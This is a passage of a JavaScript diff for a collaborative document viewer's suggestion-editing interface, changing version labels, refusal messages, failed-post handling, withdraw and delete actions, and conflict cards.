+S('L1', 'Small screens and old viewer', 'An older viewer: a plain comment with the fallback sentence and the \u201ccannot show\u201d note; no mark on the page', { legacy: true, sidebar: true });
+S('P1', 'Presence', 'A peer\u2019s view while Priya types: \u201cPriya is suggesting\u2026\u201d on the passage plus her caret, never her text', { peers: MD_PEERS_P1 });
+S('P1-dark', 'Presence', 'P1 in dark mode', { label: 'P1', theme: 'dark', peers: MD_PEERS_P1 });
+S('P2', 'Presence', 'The same view after Priya leaves the paragraph: her change appears inline', { peers: [{ who: 'priya', block: 'h2b', off: 4 }, { who: 'marcus', block: 'li3', off: 36 }], after: () => remoteArrive('c-forms', 'Priya posted a suggestion \u00b7 just now') });
+S('P3', 'Presence', 'The \u201cLive presence unavailable\u201d chip', { presence: 'off', mode: 'suggesting', after: () => placeCaret('p3', 112) });
+S('N3', 'Presence', '390\u00d7844: peer carets and the incoming indicator', { frame: '390', peers: MD_PEERS_P1 });
 
 /* ---------------- viewer state ---------------- */
 let V = null;
@@ -610,25 +611,26 @@ function freshState(st) {
   const doc = DOCS[st.cls || 'md']();
   const v = {
     st, doc, changes: doc.changes, groups: doc.groups || {},
-    active: new Set(st.active || doc.active),
+    active: new Set([...(st.active || doc.active), ...(st.extra || [])]),
     mode: st.mode || 'reading', applied: !!st.applied, signedIn: st.signedIn !== false,
     presence: st.presence || 'live',
     peers: (st.peers || []).map((p) => ({ ...p, typing: p.typing ? { ...p.typing } : null })),
     draft: null, folded: [], receipt: null,
-    unsent: st.unsent ? UNSENT.map((u) => ({ ...u })) : [], unsentOpen: true,
     sidebar: !!st.sidebar, legacy: !!st.legacy, outcomes: st.outcomes ? OUTCOMES : null,
-    version: st.version || 2, frame: frameOverride || st.frame || 'full', keyboard: !!st.keyboard,
-    seq: 0, note: null, noticeSeen: false, blockEls: {}, card: null, offer: null, refusal: null, chromePop: null,
+    unavailable: st.unavailable ? UNAVAILABLE[st.unavailable] : null,
+    version: st.version || 1, versions: st.versions || st.version || 1,
+    frame: frameOverride || st.frame || 'full', keyboard: !!st.keyboard,
+    seq: 0, note: null, blockEls: {}, card: null, offer: null, refusal: null, chromePop: null,
   };
   v.room = v.peers.map((p) => p.who);
   return v;
 }
 const blockById = (id) => V.doc.blocks.find((b) => b.id === id);
-const twinsOf = (id) => { const b = blockById(id); return b.twin ? V.doc.blocks.filter((x) => x.twin === b.twin).map((x) => x.id) : [id]; };
+const twinsOf = (id) => [id];
 const isActive = (id) => V.active.has(id);
 const chgDel = (id) => (V.groups[id] ? V.groups[id].del : V.changes[id].del);
-const shownChange = (id) => { const g = V.groups[id]; if (!g) return V.changes[id]; const c = g.chosen && g.chosen !== 'orig' ? g.chosen : g.default; return V.changes[c]; };
-const appliedText = (id) => { const g = V.groups[id]; if (g && g.chosen === 'orig') return g.del; return shownChange(id).ins; };
+const shownChange = (id) => (V.groups[id] ? V.changes[V.groups[id].default] : V.changes[id]);
+const appliedText = (id) => shownChange(id).ins;
 const authorOf = (id) => shownChange(id).author;
 
 function effRuns(b) {
@@ -637,7 +639,7 @@ function effRuns(b) {
     let x = r;
     if (r.t === 'chg' && !isActive(r.id)) x = T(chgDel(r.id), r.fmt);
     const last = out[out.length - 1];
-    if (x.t === 'text' && last && last.t === 'text' && last.fmt === x.fmt && last.ro === x.ro) out[out.length - 1] = { ...last, text: last.text + x.text };
+    if (x.t === 'text' && last && last.t === 'text' && last.fmt === x.fmt) out[out.length - 1] = { ...last, text: last.text + x.text };
     else out.push({ ...x });
   }
   return out;
@@ -681,7 +683,6 @@ function buildViewer() {
   buildStage();
   renderThread();
   renderReceipt();
-  renderUnsent();
 }
 
 function buildBand() {
@@ -691,10 +692,10 @@ function buildBand() {
     h('div', { class: 'mark' }, 'relik.link'),
     h('div', { class: 'identity' },
       h('div', { class: 'filename', title: d.filename }, d.filename),
-      h('div', { class: 'identity-meta' }, h('span', { class: 'accession' }, d.accession), h('span', { class: 'version-label' }, `v${V.version} of ${V.version}`))));
+      h('div', { class: 'identity-meta' }, h('span', { class: 'accession' }, d.accession), h('span', { class: 'version-label' }, `Version ${V.version} of ${V.versions}`))));
   const actions = h('div', { class: 'actions' },
     h('span', { class: 'action marker', title: d.marker }, icon('source'), h('span', null, d.marker)),
-    h('button', { type: 'button', class: 'action action-comments', 'aria-pressed': String(V.sidebar), onclick: () => { V.sidebar = !V.sidebar; renderThread(); refreshBand(); } }, icon('comment'), h('span', null, 'Comments'), h('span', { class: 'action-count' }, String(V.outcomes ? V.outcomes.length : n))),
+    h('button', { type: 'button', class: 'action action-comments', 'aria-pressed': String(V.sidebar), onclick: () => { V.sidebar = !V.sidebar; renderThread(); refreshBand(); } }, icon('comment'), h('span', null, 'Comments'), h('span', { class: 'action-count' }, String(n))),
     h('button', { type: 'button', class: 'action action-share' }, icon('share'), h('span', null, 'Share')),
     !V.signedIn ? h('button', { type: 'button', class: 'action', onclick: () => openSignIn() }, icon('user'), h('span', null, 'Sign in')) : null);
   bar.append(actions);
@@ -708,16 +709,17 @@ function buildStrip() {
   const sugg = V.mode === 'suggesting' && !V.applied;
   const seg = h('div', { class: 'sg-seg', role: 'group', 'aria-label': 'Mode' },
     h('button', { type: 'button', 'aria-pressed': String(!sugg), onmousedown: noFocus, onclick: () => setMode('reading') }, icon('book'), h('span', null, 'Reading')),
-    h('button', { type: 'button', 'data-suggest-toggle': '', 'aria-pressed': String(sugg), disabled: V.applied || V.outcomes ? true : null,
-      title: V.applied ? 'The applied view is read-only' : V.outcomes ? 'Suggestions on older versions are read-only' : 'Type straight into the text; each change becomes a suggestion',
+    h('button', { type: 'button', 'data-suggest-toggle': '', 'aria-pressed': String(sugg), disabled: V.applied || V.unavailable ? true : null,
+      title: V.unavailable || (V.applied ? 'The applied view is read-only' : 'Type straight into the text; each change becomes a suggestion'),
       onmousedown: noFocus, onclick: () => setMode('suggesting') }, icon('pencil'), h('span', null, 'Suggesting')));
   const sw = h('button', { type: 'button', class: 'sg-switch', role: 'switch', 'aria-checked': String(V.applied), onmousedown: noFocus, onclick: () => setApplied(!V.applied) },
     h('span', { class: 'sg-switch-box' }), h('span', null, 'Show suggestions applied'));
   let meta;
   if (V.note) meta = h('span', { class: 'sg-strip-meta is-note', role: 'status' }, V.note);
-  else if (V.applied) meta = h('span', { class: 'sg-strip-meta' }, cls === 'html' || cls === 'jsx' ? 'Second frame, merged source. Read-only.' : 'Read-only. Copy, or reply on edited text.');
-  else if (sugg) meta = h('span', { class: 'sg-strip-meta' }, cls === 'code' ? 'Type in the file. Leave the lines to post; Esc cancels.' : cls === 'md' ? 'Type anywhere. Leave the paragraph to post; Esc cancels.' : 'You are typing into the publisher\u2019s page. Leave the block to post.');
-  else if (V.outcomes) meta = h('span', { class: 'sg-strip-meta' }, 'Version 3. Suggestions on version 2 are read-only.');
+  else if (V.unavailable) meta = h('span', { class: 'sg-strip-meta', role: 'note' }, V.unavailable);
+  else if (V.applied) meta = h('span', { class: 'sg-strip-meta' }, 'Read-only. Copy, or reply on edited text.');
+  else if (sugg) meta = h('span', { class: 'sg-strip-meta' }, cls === 'code' ? 'Type in the file. Leave the lines to post; Esc cancels.' : 'Type anywhere. Leave the paragraph to post; Esc cancels.');
+  else if (!suggestionIds().length) meta = h('span', { class: 'sg-strip-meta' }, 'No suggestions on this version yet.');
   else meta = h('span', { class: 'sg-strip-meta' }, `${suggestionIds().length} suggestions \u00b7 hover one to reply`);
   const strip = h('div', { class: 'sg-strip' }, seg, sw, presenceChip(), meta);
   if (V.strip) V.strip.replaceWith(strip);
@@ -740,17 +742,8 @@ function buildStage() {
   V.stage.replaceChildren();
   V.blockEls = {}; V.gutter = null; V.card = null; V.offer = null; V.refusal = null; V.hintEl = null;
   const cls = V.doc.cls;
-  if (V.outcomes) V.stage.append(h('div', { class: 'notice is-info', role: 'status' }, icon('check'), h('p', null, 'Version 3 is current. Dana applied 1 suggestion from version 2 and answered the other 5. Suggestions on version 2 are read-only.')));
-  if (V.legacy) V.stage.append(h('div', { class: 'notice' }, icon('warn'), h('p', null, 'This viewer build predates suggestions. It shows each one as an ordinary comment on its quote.')));
-  let docEl;
-  if (cls === 'code') docEl = buildCode();
-  else if (cls === 'md') docEl = buildBlocks(h('article', { class: 'doc prose', 'data-root': '' }));
-  else {
-    const page = buildBlocks(h('article', { class: 'frame-page ' + V.doc.pageClass, 'data-root': '' }));
-    docEl = h('div', { class: 'frame-shell' },
-      h('div', { class: 'frame-label' }, icon('frame'), V.applied ? 'Applied view \u00b7 second frame rendering the merged source' : `${V.doc.filename} \u00b7 publisher\u2019s page \u00b7 sandboxed frame, no network`),
-      page);
-  }
+  if (V.legacy) V.stage.append(h('p', { class: 'mk-note', style: 'max-width:46rem;margin:0 auto 1rem' }, 'Mock: an older viewer build (a stale tab, or the negative-control build). It has no suggestion code, so the source anchor is an unknown kind and nothing is painted.'));
+  const docEl = cls === 'code' ? buildCode() : buildBlocks(h('article', { class: 'doc prose', 'data-root': '' }));
   V.stage.append(docEl);
   V.presenceEl = h('div', { class: 'presence-layer', 'aria-hidden': 'true' });
   V.stage.append(V.presenceEl);
@@ -842,7 +835,6 @@ function draftFor(b) {
   const d = V.draft;
   if (!d) return null;
   if (d.block === b.id) return d;
-  if (b.twin && blockById(d.block).twin === b.twin) return d;
   return null;
 }
 function renderBlock(id) { const b = blockById(id); const el = V.blockEls[id]; if (b && el) renderBlockContent(b, el); if (V.doc.cls === 'code') updateGutter(); }
@@ -872,7 +864,7 @@ function draftNodes(del, d) {
 function renderRun(r, i, dr) {
   const tag = fmtTag(r.fmt);
   if (r.t === 'text') {
-    const el = h(tag, { 'data-run': i, 'data-ro': r.ro, href: r.fmt === 'a' ? '#upload-contract' : null });
+    const el = h(tag, { 'data-run': i, href: r.fmt === 'a' ? '#upload-contract' : null });
     if (dr && dr.run === i && !dr.editing) {
       addText(el, r.text.slice(0, dr.s));
       el.append(...draftNodes(r.text.slice(dr.s, dr.e), dr));
@@ -894,24 +886,31 @@ function renderRun(r, i, dr) {
     const txt = appliedText(id);
     if (!txt) return h('span', { class: 'sg-applied-gap', 'data-run': i, 'data-change': id, title: 'Text removed by a suggestion' });
     const w = h('span', { class: 'sg-applied', 'data-run': i, 'data-change': id });
-    addText(wrapIn(w), txt);
+    const inner = wrapIn(w);
+    /* The escape-first renderer draws a link a suggestion added with no href (plan 3.5). */
+    if (ch.applied) for (const part of ch.applied) inner.append(typeof part === 'string' ? part : h('a', { title: 'Link added by a suggestion', 'data-added-link': '' }, part.a));
+    else addText(inner, txt);
     return w;
   }
   if (V.legacy) {
-    const quoteHasMarkup = !!r.fmt;
-    if (quoteHasMarkup) { const el = h(tag, { 'data-run': i }); el.append(del); return el; }
-    const w = h('mark', { class: 'relic-text-mark', 'data-run': i, 'data-change': id }, del);
-    return w;
+    const el = h(tag, { 'data-run': i, href: r.fmt === 'a' ? '#upload-contract' : null });
+    addText(el, del);
+    return el;
   }
+  const cid = g ? g.default : id;
+  const out = V.outcomes && V.outcomes[cid];
   const mine = ch.author === 'you';
-  const w = h('span', { class: 'sg-chg' + (mine ? ' is-mine' : '') + (g ? ' is-conflict' : '') + (V.flash === id ? ' is-new' : ''), 'data-run': i, 'data-change': id,
-    tabindex: V.mode === 'reading' ? '0' : null, 'aria-label': `Suggestion by ${PEOPLE[ch.author].name}: ${del ? 'replace \u201c' + del + '\u201d with' : 'insert'} \u201c${ch.ins}\u201d` });
+  const what = del && ch.ins ? `replace \u201c${del}\u201d with \u201c${ch.ins}\u201d` : del ? `delete \u201c${del}\u201d` : `insert \u201c${ch.ins}\u201d`;
+  const w = h('span', { class: 'sg-chg' + (mine ? ' is-mine' : '') + (g ? ' is-conflict' : '') + (out ? ' is-out-' + out.tone : '') + (V.flash === id ? ' is-new' : ''), 'data-run': i, 'data-change': id,
+    tabindex: V.mode === 'reading' ? '0' : null, 'aria-label': `Suggestion by ${PEOPLE[ch.author].name}: ${what}${out ? ', ' + out.badge : ''}` });
   const inner = wrapIn(w);
   if (del) inner.append(h('del', { class: 'sg-del' }, del));
   if (ch.ins) inner.append(h('ins', { class: 'sg-ins' }, ch.ins));
   if (g) w.append(chip(String(g.members.length), null, `${g.members.length} suggestions on this passage`));
-  if (ch.also && ch.also.length) w.append(chip('\u00d7' + (1 + ch.also.length), 'is-soft', 'Also suggested by ' + ch.also.map((k) => PEOPLE[k].name).join(', ')));
-  if (mine) w.append(chip('you', 'is-soft', 'Your suggestion'));
+  if (ch.also && ch.also.length) w.append(chip('also ' + ch.also.map(first).join(', '), 'is-soft', 'Also suggested by ' + ch.also.map((k) => PEOPLE[k].name).join(', ')));
+  if (out) w.append(chip(out.chip, 'is-out' + (out.tone === 'ok' ? ' is-ok' : ''), out.badge));
+  if (ch.unposted) w.append(chip('not posted', 'is-unposted', 'This suggestion did not reach Relic'));
+  if (mine && !out && !ch.unposted) w.append(chip('you', 'is-soft', 'Your suggestion'));
   if (ch.overlapBy) w.append(chip('+1', 'is-fold', `${first(V.changes[ch.overlapBy].author)} also changed this passage`));
   return w;
 }
@@ -948,8 +947,6 @@ function locate(node0, off0) {
   const blockEl = el.closest('[data-block]');
   if (!blockEl) return null;
   const block = blockEl.dataset.block;
-  const ro = el.closest('[data-ro]');
-  if (ro) return { block, ro: ro.dataset.ro, el: ro };
   const runEl = el.closest('[data-run]');
   if (!runEl) return { block, run: -1 };
   const run = +runEl.dataset.run;
@@ -990,7 +987,6 @@ function rectOfRange(rg) {
 
 /* ---------------- the editor engine ---------------- */
 function newDraft(block, run, s, e, ins, extra) { return { block, run, s, e, ins, caret: ins.length, hist: [], ...(extra || {}) }; }
-const isFrame = () => V.doc.cls === 'html' || V.doc.cls === 'jsx';
 
 function handleInput(e) {
   if (!V) return;
@@ -1012,12 +1008,13 @@ function handleInput(e) {
   if (t === 'insertText' || t === 'insertReplacementText' || t === 'insertCompositionText') data = e.data != null ? e.data : (e.dataTransfer ? e.dataTransfer.getData('text/plain') : '');
   else if (t === 'insertFromPaste' || t === 'insertFromDrop' || t === 'insertFromYank') data = (e.dataTransfer ? e.dataTransfer.getData('text/plain') : '').replace(/\r\n?/g, '\n');
   else if (t === 'insertParagraph' || t === 'insertLineBreak') {
-    if (isFrame()) return refuse('newline-needs-markup', rect);
+    const tag = blockById(a.block).tag;
+    if (V.doc.cls === 'md' && tag !== 'p') return refuse('newline-here', rect, null, null, { tag });
     data = V.doc.cls === 'code' ? '\n' : '\n\n';
   }
   const del = t.startsWith('delete') ? (t.includes('Backward') ? 'back' : 'fwd') : null;
   if (data == null && !del) return;
-  if (a.ro || b.ro) return refuse('not-source-text', rect, null, null, { ro: a.ro || b.ro });
+  if (data && data.includes('|') && /^t[dh]$/.test(blockById(a.block).tag)) return refuse('pipe-in-cell', rect);
   if (a.block !== b.block) return refuse('crosses-blocks', rect);
   if (a.run < 0 || b.run < 0) return;
   if (a.where === 'others-ins' || b.where === 'others-ins') return refuse('others-insertion', rect, a.id || b.id);
@@ -1178,7 +1175,7 @@ function onKeyDown(e) {
 }
 function synthInput(inputType, data, sticky) {
   V.stickyRefusal = !!sticky;
-  handleInput({ inputType, data, dataTransfer: null, preventDefault() {} });
+  handleInput({ inputType, data, dataTransfer: inputType.startsWith('insertFrom') ? { getData: () => data } : null, preventDefault() {} });
   V.stickyRefusal = false;
 }
 
@@ -1199,16 +1196,18 @@ function sourceFor(fmt, del, ins) {
     const wrap = { strong: (x) => `**${x}**`, em: (x) => `*${x}*`, code: (x) => '`' + x + '`', a: (x) => `[${x}](#upload-contract)` }[fmt];
     return wrap ? [wrap(del), wrap(ins)] : null;
   }
-  if (cls === 'html' || cls === 'jsx') {
-    const esc = cls === 'jsx' ? escJsx : escHtml;
-    if (esc(del) !== del || esc(ins) !== ins) return [esc(del), esc(ins)];
-  }
   return null;
 }
 
-function commit(reason) {
+function commit(reason, opts) {
   const d = V.draft;
   if (!d) return;
+  /* locate() must find the same range before posting; a repeating passage keeps the draft (plan 3.2.6). */
+  if (!d.editing && blockById(d.block).repeats && reason !== 'pagehide' && reason !== 'hidden') {
+    d.repeats = true;
+    renderDraft();
+    return;
+  }
   V.committing = true;
   V.draft = null;
   try {
@@ -1251,13 +1250,24 @@ function commit(reason) {
       bb.runs = [...rr.slice(0, d.run), ...(s ? [T(r.text.slice(0, s), r.fmt)] : []), C(id, r.fmt), ...(e < r.text.length ? [T(r.text.slice(e), r.fmt)] : []), ...rr.slice(d.run + 1)];
       renderBlock(bid);
     }
-    const notice = isFrame() && !V.noticeSeen;
-    showReceipt({ kind: 'posted', title: 'Suggestion posted', del, ins, source: ch.source, id, notice,
-      repeated: twins.length > 1 ? twins.length : 0,
+    const discard = () => {
+      for (const [bid, rr] of snaps) { blockById(bid).runs = rr; renderBlock(bid); }
+      V.active.delete(id); delete V.changes[id];
+    };
+    if (opts && opts.fail) {
+      ch.unposted = true;
+      renderBlock(d.block);
+      showReceipt({ kind: 'failed', title: 'Not posted', del, ins, source: ch.source,
+        sub: 'Relic did not answer, so this suggestion was not sent. It stays here until you retry or discard it.',
+        warn: 'Leaving this page now will ask you first.',
+        retry: () => { ch.unposted = false; renderBlock(d.block); showReceipt({ kind: 'posted', title: 'Suggestion posted', del, ins, source: ch.source, id, sub: 'Retried: no identical suggestion from you was there, so this one posted.' }); renderThread(); },
+        discard: () => { discard(); V.receipt = null; renderReceipt(); renderThread(); refreshBand(); refreshStrip(); } });
+      return;
+    }
+    showReceipt({ kind: 'posted', title: 'Suggestion posted', del, ins, source: ch.source, id,
       sub: reason === 'pagehide' || reason === 'hidden' ? 'Sent as the page closed.' : null,
       undo: () => {
-        for (const [bid, rr] of snaps) { blockById(bid).runs = rr; renderBlock(bid); }
-        V.active.delete(id); delete V.changes[id];
+        discard();
         showReceipt({ kind: 'undone', title: 'Undone', sub: 'The suggestion was deleted. Nothing of it remains on the relic.' });
         renderThread(); refreshBand(); refreshStrip();
       } });
@@ -1277,7 +1287,7 @@ function cancelDraft() {
   renderBlockAndTwins(d.block);
   applyFolds(d);
   updateHint();
-  flashHint(d.block, isFrame() ? 'Draft cancelled. Nothing was sent; the page\u2019s scripts saw what you typed.' : 'Draft cancelled. Nothing was sent.');
+  flashHint(d.block, 'Draft cancelled. Nothing was sent.');
   drawPresence();
 }
 function applyFolds(d) {
@@ -1302,7 +1312,7 @@ function ensureMarker(bid, id) {
   const runs = effRuns(b);
   for (let i = 0; i < runs.length; i++) {
     const r = runs[i];
-    if (r.t !== 'text' || r.ro) continue;
+    if (r.t !== 'text') continue;
     const k = r.text.indexOf(del);
     if (k < 0) continue;
     b.runs = [...runs.slice(0, i), ...(k ? [T(r.text.slice(0, k), r.fmt)] : []), C(id, r.fmt), ...(k + del.length < r.text.length ? [T(r.text.slice(k + del.length), r.fmt)] : []), ...runs.slice(i + 1)];
@@ -1334,9 +1344,8 @@ function remoteArrive(id, note) {
 function leaveText(d) {
   const cls = V.doc.cls;
   if (cls === 'code') return 'Leave these lines to post';
-  if (isFrame()) return 'Leave the block to post';
   const tag = blockById(d.block).tag;
-  return tag === 'li' ? 'Leave the item to post' : /^h\d$/.test(tag) ? 'Leave the heading to post' : 'Leave the paragraph to post';
+  return { li: 'Leave the item to post', blockquote: 'Leave the quote to post', td: 'Leave the cell to post', th: 'Leave the cell to post' }[tag] || (/^h\d$/.test(tag) ? 'Leave the heading to post' : 'Leave the paragraph to post');
 }
 function clearHint() {
   if (V.hintEl) V.hintEl.remove();
@@ -1368,8 +1377,7 @@ function updateHint() {
   parts.push(h('span', null, 'Esc cancels'), h('span', null, leaveText(d)));
   parts.push(h('span', { class: 'sg-count' }, h('span', { class: near(sb, 512) ? 'is-near' : null }, `Struck ${nfmt(sb)} / 512 B`)));
   parts.push(h('span', { class: 'sg-count' }, h('span', { class: near(ib, 2048) ? 'is-near' : null }, `Inserted ${nfmt(ib)} / 2,048 B`)));
-  const tw = twinsOf(d.block).length;
-  if (tw > 1) parts.push(h('span', { class: 'is-warn' }, `Appears ${tw} times \u00b7 your suggestion changes all of them`));
+  if (d.repeats) parts.push(h('span', { class: 'is-warn' }, 'This passage repeats in the source. Select a longer passage.'));
   if (V.folded.length) parts.push(h('span', { class: 'is-fold' }, `+${V.folded.length} incoming from ${V.folded.map((id) => first(V.changes[id].author)).join(', ')}, shown when you post`));
   placeHint(h('div', { class: 'sg-hint', role: 'status', 'aria-live': 'polite' }, ...parts), anchor);
 }
@@ -1509,8 +1517,8 @@ const REFUSALS = {
   'crosses-blocks': () => 'A suggestion stays inside one paragraph. Select within a single block.',
   'quote-too-long': (id, n) => `That strikes ${nfmt(n)} bytes. A suggestion can strike up to 512.`,
   'too-long': (id, n) => `That would insert ${nfmt(n)} bytes. A suggestion can insert up to 2,048.`,
-  'newline-needs-markup': () => 'A new line here needs markup, and suggestions carry text only. Type the words, then reply with the layout you want.',
-  'not-source-text': (id, n, opt) => opt && opt.ro === 'expr' ? 'This text comes from code, not the page\u2019s source text.' : 'This text is written by the page\u2019s script, not its source text, so it can\u2019t take a suggestion.',
+  'newline-here': (id, n, opt) => `A line break can\u2019t go inside ${{ li: 'a list item', blockquote: 'a quote', td: 'a table cell', th: 'a table cell' }[opt.tag] || 'a heading'}. Suggest the words, and reply if the layout should change.`,
+  'pipe-in-cell': () => 'A | would split this table cell. Use another character, or reply describing the change.',
   formatting: () => 'Formatting isn\u2019t part of a suggestion. Type the words; reply if the styling matters.',
   'edit-edge': () => 'That reaches past your own suggestion. Leave it, then start a new one beside it.',
 };
@@ -1590,9 +1598,22 @@ function onOut(e) {
   clearTimeout(V.hoverIn);
   scheduleClose();
 }
-function statusLine(ch) {
-  if (ch.author === 'you') return 'Waiting for the publisher. Yours: type in it while Suggesting to change it.';
-  return 'Waiting for the publisher. Replies don\u2019t settle it; only Dana\u2019s outcome does.';
+const BADGE_CLASS = { ok: 'comment-badge is-ok', quiet: 'comment-badge is-soft', soft: 'comment-badge is-soft', wait: 'comment-badge' };
+/* The state line for a card or a panel row (plan 3.3): pending on the current version,
+   the publisher's outcome and note on an older one. */
+function stateEl(id) {
+  const ch = V.changes[id];
+  const out = V.outcomes && V.outcomes[id];
+  if (out) return h('span', { class: 'card-status' }, h('span', { class: BADGE_CLASS[out.tone] }, out.badge));
+  return h('span', { class: 'card-status' }, h('span', { class: 'comment-badge is-soft' }, 'Suggested'),
+    h('span', null, ch.author === 'you' ? 'Waiting for the publisher. To change it, type in it while Suggesting.' : 'Waiting for the publisher. A reply does not settle it.'));
+}
+function outcomeNote(id) {
+  const out = V.outcomes && V.outcomes[id];
+  if (!out || !out.note) return null;
+  return h('ol', { class: 'card-replies', 'aria-label': 'Publisher note' }, h('li', null,
+    h('div', { class: 'card-reply-head' }, h('b', null, PEOPLE.dana.name), h('span', { class: 'card-yours', style: 'margin-left:0' }, 'publisher'), h('span', null, 'with version 2')),
+    h('p', { class: 'card-reply-body' }, out.note)));
 }
 function repliesList(ch) {
   if (!ch.replies.length) return null;
@@ -1600,26 +1621,36 @@ function repliesList(ch) {
     h('div', { class: 'card-reply-head' }, h('b', null, PEOPLE[r.who].name), r.who === 'dana' ? h('span', { class: 'card-yours', style: 'margin-left:0' }, 'publisher') : null, h('span', null, r.time)),
     h('p', { class: 'card-reply-body' }, r.body))));
 }
-function composer(ch) {
-  const ta = h('textarea', { class: 'popover-field', rows: '2', placeholder: ch.author === 'you' ? 'Add context for the publisher' : `Reply to ${first(ch.author)}`, 'aria-label': 'Reply' });
-  const send = () => {
-    const body = ta.value.trim();
-    if (!body) { ta.focus(); return; }
-    ch.replies.push({ who: 'you', time: 'just now', body });
-    refreshCard(); renderThread();
-  };
-  ta.addEventListener('keydown', (e) => { if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) { e.preventDefault(); send(); } });
-  return [ta, h('div', { class: 'popover-tools' },
-    h('button', { type: 'button', class: 'popover-action is-primary', onclick: send }, 'Reply'),
-    ch.author === 'you' && !ch.group ? h('button', { type: 'button', class: 'popover-action is-quiet', onclick: () => deleteMine(ch) }, icon('trash'), 'Delete suggestion') : null,
-    h('button', { type: 'button', class: 'popover-action is-quiet is-end', onclick: closeCard }, 'Close'))];
+function composer(ch, id) {
+  const tools = [];
+  const mine = ch.author === 'you';
+  if (!V.outcomes) {
+    const ta = h('textarea', { class: 'popover-field', rows: '2', placeholder: mine ? 'Add context for the publisher' : `Reply to ${first(ch.author)}`, 'aria-label': 'Reply' });
+    const send = () => {
+      const body = ta.value.trim();
+      if (!body) { ta.focus(); return; }
+      ch.replies.push({ who: 'you', time: 'just now', body });
+      refreshCard(); renderThread();
+    };
+    ta.addEventListener('keydown', (e) => { if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) { e.preventDefault(); send(); } });
+    tools.push(h('button', { type: 'button', class: 'popover-action is-primary', onclick: send }, 'Reply'));
+    /* Author actions: Edit is hidden because it would strip the payload; Resolve becomes Withdraw. */
+    if (mine) tools.push(
+      h('button', { type: 'button', class: 'popover-action', onclick: () => removeMine(id, 'withdraw') }, 'Withdraw'),
+      h('button', { type: 'button', class: 'popover-action is-quiet', onclick: () => removeMine(id, 'delete') }, icon('trash'), 'Delete'));
+    tools.push(h('button', { type: 'button', class: 'popover-action is-quiet is-end', onclick: closeCard }, 'Close'));
+    return [ta, h('div', { class: 'popover-tools' }, ...tools)];
+  }
+  return [h('div', { class: 'popover-tools' }, h('button', { type: 'button', class: 'popover-action is-quiet is-end', onclick: closeCard }, 'Close'))];
 }
-function deleteMine(ch) {
-  const id = Object.keys(V.changes).find((k) => V.changes[k] === ch);
+function removeMine(id, how) {
+  const ch = V.changes[id];
   closeCard();
   V.active.delete(id);
-  renderBlockAndTwins(ch.block);
-  showReceipt({ kind: 'removed', title: 'Suggestion removed', del: ch.del, ins: ch.ins, undo: () => { V.active.add(id); renderBlockAndTwins(ch.block); showReceipt({ kind: 'undone', title: 'Undone', sub: 'Your suggestion is back.' }); renderThread(); refreshBand(); } });
+  renderBlock(ch.block);
+  const back = () => { V.active.add(id); renderBlock(ch.block); showReceipt({ kind: 'undone', title: 'Undone', sub: 'Your suggestion is back.' }); renderThread(); refreshBand(); };
+  if (how === 'withdraw') showReceipt({ kind: 'removed', title: 'Suggestion withdrawn', del: ch.del, ins: ch.ins, sub: 'It stays in the comments as Withdrawn, so Dana can see why it went.', undo: back });
+  else showReceipt({ kind: 'removed', title: 'Suggestion deleted', del: ch.del, ins: ch.ins, sub: 'Gone from the relic for everyone.', undo: back });
   renderThread(); refreshBand(); refreshStrip();
 }
 function sourceRow(src) { return src ? h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Source'), h('span', { class: 'v' }, h('code', null, src[0]), ' \u2192 ', h('code', null, src[1]))) : null; }
@@ -1628,43 +1659,38 @@ function changeCard(id) {
   const p = PEOPLE[ch.author];
   return h('div', { class: 'popover popover-card sg-card', role: 'dialog', 'aria-label': `Suggestion by ${p.name}` },
     h('div', { class: 'card-head' },
-      h('span', { class: 'card-who' }, p.name),
+      h('span', { class: 'card-who' }, ch.display || p.name),
       ch.author === 'you' ? h('span', { class: 'card-yours' }, 'yours') : null,
       h('span', { class: 'card-time' }, ch.time),
       h('span', { class: 'card-verified', title: 'Verified by email code' }, icon('verified'), p.email)),
     h('div', { class: 'card-diff' }, ch.del ? h('del', { class: 'sg-del' }, ch.del) : null, ch.ins ? h('ins', { class: 'sg-ins' }, ch.ins) : null),
     sourceRow(ch.source),
     ch.also && ch.also.length ? h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Also'), h('span', { class: 'v' }, 'Also suggested by ' + ch.also.map((k) => `${PEOPLE[k].name} (${PEOPLE[k].email})`).join(', '))) : null,
-    h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Status'), h('span', { class: 'v' }, statusLine(ch))),
+    h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'State'), h('span', { class: 'v' }, stateEl(id))),
+    outcomeNote(id),
     repliesList(ch),
-    ...composer(ch));
+    ...composer(ch, id));
 }
+/* Conflicts: the default member shows inline with a count badge; the card lists every
+   member. There is no chooser (plan 3.6). */
 function conflictCard(gid) {
   const g = V.groups[gid];
-  const sel = g.chosen || g.default;
-  const focus = g.focus || (sel === 'orig' ? g.default : sel);
-  const fs = h('fieldset', { class: 'card-choices' }, h('legend', null, 'Show in my applied view'));
-  const choose = (val) => { g.chosen = val; if (val !== 'orig') g.focus = val; if (V.applied) renderBlock(g.block); refreshCard(); };
-  for (const mid of g.members) {
+  const def = V.changes[g.default];
+  const members = h('ol', { class: 'card-members' }, ...g.members.map((mid) => {
     const m = V.changes[mid];
-    fs.append(h('label', { class: 'card-choice' },
-      h('input', { type: 'radio', name: 'choice-' + gid, value: mid, checked: sel === mid ? true : null, onchange: () => choose(mid) }),
-      h('span', { class: 'card-choice-who' }, PEOPLE[m.author].name, mid === g.default ? h('span', { class: 'card-choice-tag' }, 'shown inline') : null),
-      h('ins', { class: 'sg-ins card-choice-text' }, m.ins)));
-  }
-  fs.append(h('label', { class: 'card-choice' },
-    h('input', { type: 'radio', name: 'choice-' + gid, value: 'orig', checked: sel === 'orig' ? true : null, onchange: () => choose('orig') }),
-    h('span', { class: 'card-choice-who' }, 'Keep the original'),
-    h('span', { class: 'card-choice-text' }, g.del)));
-  const fm = V.changes[focus];
+    const out = V.outcomes && V.outcomes[mid];
+    return h('li', { class: 'card-member' },
+      h('span', { class: 'card-member-who' }, PEOPLE[m.author].name, h('span', { class: 'card-time' }, m.time + (m.replies.length ? ` \u00b7 ${m.replies.length} repl${m.replies.length > 1 ? 'ies' : 'y'}` : ''))),
+      h('button', { type: 'button', class: 'popover-action', onclick: () => openCard(mid, { anchor: findAnchor(gid), pinned: true }) }, V.outcomes ? 'Open' : 'Reply'),
